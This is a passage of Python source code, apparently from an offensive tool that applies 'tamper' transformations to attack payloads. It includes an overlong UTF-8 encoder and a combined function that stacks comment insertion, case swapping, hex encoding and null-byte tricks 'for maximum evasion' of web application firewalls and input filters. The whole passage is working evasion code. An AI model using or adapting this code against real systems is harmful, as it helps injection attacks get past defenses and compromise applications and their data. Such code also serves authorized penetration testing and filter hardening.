    def overlong_utf8_encoding(self, payload: str) -> str:
        def overlong(c):
            if ord(c) < 128:
                return chr(0xC0 | (ord(c) >> 6)) + chr(0x80 | (ord(c) & 0x3F))
            return c
        return "".join(overlong(c) if random.random() > 0.85 and ord(c) < 128 else c for c in payload)

    def combined_attack(self, payload: str, level: int = 3) -> str:
        """Apply multiple tamper levels for maximum evasion"""
        levels = [
            ["comment_between", "case_swapping"],
            ["comment_between", "case_swapping", "space2comment", "str2char"],
            ["comment_between", "case_swapping", "space2comment", "str2char", "hex_encoding", "null_byte"],
        ]
        idx = min(level - 1, len(levels) - 1)
        result = payload
        for tamper in levels[idx]:
            if tamper in self.tampers:
                result = self.tampers[tamper](result)
        return result
